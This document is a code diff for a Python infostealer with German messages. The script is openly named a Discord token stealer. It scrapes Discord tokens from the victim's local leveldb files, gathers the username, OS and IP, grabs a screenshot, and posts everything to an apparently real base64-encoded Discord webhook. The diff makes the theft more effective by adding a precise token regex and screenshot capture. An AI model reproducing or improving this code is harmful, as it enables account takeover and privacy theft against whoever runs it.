@@ -5,9 +5,11 @@ import socket
 import getpass
 import platform
 import base64
+import re
+from io import BytesIO
+from PIL import ImageGrab
 
-# Base64-kodierte Webhook-URL (leer für Demo, sonst echte URL base64-kodieren)
-encoded_webhook_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTkxODA4MzU2MDM3NDM4Mi9XMkw3R1F4WG1WVXBzVDR0ZU4ybThRZ3RvMEx6cmhNTFhfMk1zTUNVNlItdGlnTllSdElSQ3k3T2dwbmVsR3dyYUJSNg=="  # z.B. "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5"
+encoded_webhook_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTkxODA4MzU2MDM3NDM4Mi9XMkw3R1F4WG1WVXBzVDR0ZU4ybThRZ3RvMEx6cmhNTFhfMk1zTUNVNlItdGlnTllSdElSQ3k3T2dwbmVsR3dyYUJSNg=="
 
 def get_webhook_url():
     if not encoded_webhook_url:
@@ -30,6 +32,7 @@ def get_os_info():
     return platform.platform()
 
 def steal_discord_tokens():
+    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
     paths = [
         os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
         os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
@@ -45,27 +48,30 @@ def steal_discord_tokens():
                 continue
             try:
                 with open(os.path.join(path, file), errors='ignore') as f:
-                    for line in f:
-                        if "mfa." in line or "token" in line:
-                            tokens.append(line.strip())
+                    content = f.read()
+                    found_tokens = token_regex.findall(content)
+                    tokens.extend(found_tokens)
             except:
                 pass
-    return tokens
+    return list(set(tokens))
 
-def steal_cookies():
-    return ["cookie1=demo_cookie", "cookie2=demo_cookie"]
-
-def steal_passwords():
-    return ["pass1=demo_pass", "pass2=demo_pass"]
+def take_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        buffer = BytesIO()
+        screenshot.save(buffer, format="PNG")
+        buffer.seek(0)
+        return buffer
+    except Exception as e:
+        print(f"Screenshot Fehler: {e}")
+        return None
 
 def build_payload_dict():
     return {
         "user": get_user(),
         "os": get_os_info(),
         "ip": get_ip(),
-        "discord_tokens": steal_discord_tokens(),
-        "cookies": steal_cookies(),
-        "passwords": steal_passwords()
+        "discord_tokens": steal_discord_tokens()
     }
 
 def send_webhook(payload_dict):
@@ -84,6 +90,8 @@ def send_webhook(payload_dict):
     for key, value in payload_dict.items():
         if isinstance(value, list):
             value = "\n".join(value) if value else "Keine Daten"
+        if len(value) > 900:
+            value = value[:900] + "..."
         embed["fields"].append({
             "name": key.capitalize(),
             "value": str(value),
@@ -96,16 +104,32 @@ def send_webhook(payload_dict):
 
     headers = {"Content-Type": "application/json"}
 
-    try:
-        response = requests.post(url, json=data, headers=headers)
-        if response.status_code == 204:
-            print("Payload erfolgreich gesendet.")
-        else:
-            print(f"Fehler beim Senden: {response.status_code}")
-    except Exception as e:
-        print(f"Exception beim Senden: {e}")
+    screenshot_buffer = take_screenshot()
+    files = None
+    if screenshot_buffer:
+        files = {
+            "file": ("screenshot.png", screenshot_buffer, "image/png")
+        }
+        # multipart/form-data with file and json payload
+        try:
+            response = requests.post(url, data={"payload_json": json.dumps(data)}, files=files)
+            if response.status_code == 204:
+                print("Payload mit Screenshot erfolgreich gesendet.")
+            else:
+                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
+        except Exception as e:
+            print(f"Exception beim Senden: {e}")
+    else:
+        # fallback ohne Bild
+        try:
+            response = requests.post(url, json=data, headers=headers)
+            if response.status_code == 204:
+                print("Payload erfolgreich gesendet.")
+            else:
+                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
+        except Exception as e:
+            print(f"Exception beim Senden: {e}")
 
 if __name__ == "__main__":
     payload = build_payload_dict()
     send_webhook(payload)
-
